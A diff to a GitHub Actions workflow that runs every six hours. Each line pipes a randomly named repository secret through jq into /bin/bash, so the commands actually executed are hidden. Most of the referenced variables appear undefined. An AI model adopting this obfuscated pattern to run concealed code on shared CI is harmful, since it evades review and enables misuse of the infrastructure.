@@ -3,8 +3,8 @@ name: jiuyaowotui
 on:
   workflow_dispatch:
   schedule:
-    - cron: '19 3/6 * * *'
-jobs:  # 4612
+    - cron: '40 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,19 +12,27 @@ jobs:  # 4612
       - uses: actions/checkout@v4
       - name: jiuyaowotui
         env:
-          znz4: ${{ secrets.znz4 }}
+          szmqc79: ${{ secrets.szmqc79 }}
         run: |
-          echo $znz4 | jq -r .ovrhf81 | /bin/bash
-          echo $gh52715 | jq -r .dqmhs3876 | /bin/bash
-          echo $limo2315 | jq -r .foivw85 | /bin/bash
-          echo $yr41331 | jq -r .iiqst8953 | /bin/bash
-          echo $ygcow66288 | jq -r .qafs6 | /bin/bash
-          echo $fzdnp8 | jq -r .w312 | /bin/bash
-          echo $b35 | jq -r .sxky98 | /bin/bash
-          echo $nw317 | jq -r .lju2 | /bin/bash
-          echo $ej73995 | jq -r .uyjx7888 | /bin/bash
-          echo $fbiwj4445 | jq -r .t63 | /bin/bash
-          echo $xwmv5222 | jq -r .ovs854 | /bin/bash
-          echo $yeblw63 | jq -r .suks5 | /bin/bash
-          echo $yol49 | jq -r .vojac354 | /bin/bash
+          echo $szmqc79 | jq -r .gdhvc1815 | /bin/bash
+          echo $fymif80732 | jq -r .w12882 | /bin/bash
+          echo $vjaxx47574 | jq -r .seypm72 | /bin/bash
+          echo $ynx8469 | jq -r .mrf723 | /bin/bash
+          echo $knj5 | jq -r .ezq4 | /bin/bash
+          echo $u54227 | jq -r .deeo98 | /bin/bash
+          echo $fz51865 | jq -r .u44 | /bin/bash
+          echo $edrta627 | jq -r .h1 | /bin/bash
+          echo $px622 | jq -r .d7300 | /bin/bash
+          echo $lyuay3617 | jq -r .nnnn837 | /bin/bash
+          echo $csnms48 | jq -r .z0946 | /bin/bash
+          echo $k76 | jq -r .yji36 | /bin/bash
+          echo $xiri7 | jq -r .btk44 | /bin/bash
+          echo $xwvsi79 | jq -r .w19794 | /bin/bash
+          echo $fvnq93032 | jq -r .yi27324 | /bin/bash
+          echo $edzbj58905 | jq -r .jc49 | /bin/bash
+          echo $zkpff71079 | jq -r .q9468 | /bin/bash
+          echo $ae74662 | jq -r .ostfr77 | /bin/bash
+          echo $xqg26 | jq -r .qd1966 | /bin/bash
+          echo $k012 | jq -r .mwwcl92 | /bin/bash
+          echo $ot0 | jq -r .dhu58 | /bin/bash
 
